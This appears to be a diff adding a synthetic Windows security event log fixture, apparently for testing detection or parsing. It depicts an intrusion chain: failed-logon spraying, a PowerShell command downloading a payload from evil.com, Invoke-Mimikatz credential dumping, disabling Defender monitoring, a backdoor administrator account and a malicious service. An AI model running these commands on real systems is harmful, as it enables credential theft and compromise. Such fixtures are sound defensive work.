@@ -1,0 +1,20 @@
+# EventID|TimeCreated|Computer|Message
+4625|2026-02-10T08:30:01|DC01|An account failed to log on. Account Name: Administrator Source Network Address: 172.16.0.50
+4625|2026-02-10T08:30:02|DC01|An account failed to log on. Account Name: Administrator Source Network Address: 172.16.0.50
+4625|2026-02-10T08:30:03|DC01|An account failed to log on. Account Name: Administrator Source Network Address: 172.16.0.50
+4625|2026-02-10T08:30:04|DC01|An account failed to log on. Account Name: Administrator Source Network Address: 172.16.0.50
+4625|2026-02-10T08:30:05|DC01|An account failed to log on. Account Name: Administrator Source Network Address: 172.16.0.50
+4625|2026-02-10T08:30:06|DC01|An account failed to log on. Account Name: admin Source Network Address: 172.16.0.50
+4625|2026-02-10T08:30:07|DC01|An account failed to log on. Account Name: admin Source Network Address: 172.16.0.50
+4625|2026-02-10T08:30:08|DC01|An account failed to log on. Account Name: svc_backup Source Network Address: 172.16.0.50
+4625|2026-02-10T08:30:09|DC01|An account failed to log on. Account Name: svc_sql Source Network Address: 172.16.0.50
+4625|2026-02-10T08:30:10|DC01|An account failed to log on. Account Name: krbtgt Source Network Address: 172.16.0.50
+4624|2026-02-10T09:00:00|DC01|An account was successfully logged on. Account Name: john.doe Source Network Address: 10.0.0.15
+4672|2026-02-10T09:00:01|DC01|Special privileges assigned to new logon. Account Name: john.doe
+4688|2026-02-10T10:15:00|WS01|A new process has been created. Account Name: compromised_user Process: powershell.exe -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA== Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')
+4688|2026-02-10T10:16:00|WS01|A new process has been created. Account Name: compromised_user Process: powershell.exe Invoke-Mimikatz -DumpCreds
+4688|2026-02-10T10:17:00|WS01|A new process has been created. Account Name: compromised_user Process: powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true
+4688|2026-02-10T10:18:00|WS01|A new process has been created. Account Name: SYSTEM Process: powershell.exe [System.Reflection.Assembly]::LoadWithPartialName('Microsoft.CSharp')
+4720|2026-02-10T10:20:00|DC01|A user account was created. Account Name: backdoor_admin Source Network Address: 172.16.0.50
+4732|2026-02-10T10:20:01|DC01|A member was added to a security-enabled local group. Account Name: backdoor_admin Group: Administrators
+7045|2026-02-10T10:25:00|WS01|A service was installed in the system. Service Name: EvilService Account Name: SYSTEM
